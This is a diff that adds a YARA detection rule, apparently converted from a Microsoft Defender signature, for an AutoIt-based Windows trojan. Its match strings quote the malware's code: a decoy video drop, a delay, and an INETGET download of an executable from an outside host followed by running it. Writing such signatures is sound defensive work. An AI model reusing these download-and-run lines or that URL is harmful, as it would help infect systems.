@@ -4683,3 +4683,28 @@ rule Trojan_Win32_AutoitInject_AMLA_2147933550_0
         (all of ($x*))
 }
 
+rule Trojan_Win32_AutoitInject_ARLA_2147933688_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win32/AutoitInject.ARLA!MTB"
+        threat_id = "2147933688"
+        type = "Trojan"
+        platform = "Win32: Windows 32-bit platform"
+        family = "AutoitInject"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
+        threshold = "9"
+        strings_accuracy = "High"
+    strings:
+        $x_1_1 = "FILEINSTALL ( \"C:\\penis.mpg\" , @TEMPDIR & \"\\\" & \"penis.mpg\" , 0 )" ascii //weight: 1
+        $x_2_2 = "SHELLEXECUTE ( @TEMPDIR & \"\\\" & \"penis.mpg\" )" ascii //weight: 2
+        $x_2_3 = "SLEEP ( 300000 )" ascii //weight: 2
+        $x_2_4 = "INETGET ( \"http://gema123.ge.ohost.de/loadit.exe\" , @APPDATADIR & \"\\loadit.exe\" , 1 , 0 )" ascii //weight: 2
+        $x_2_5 = "RUN ( @APPDATADIR & \"\\\" & \"loadit.exe\" , \"\" , \"\" )" ascii //weight: 2
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
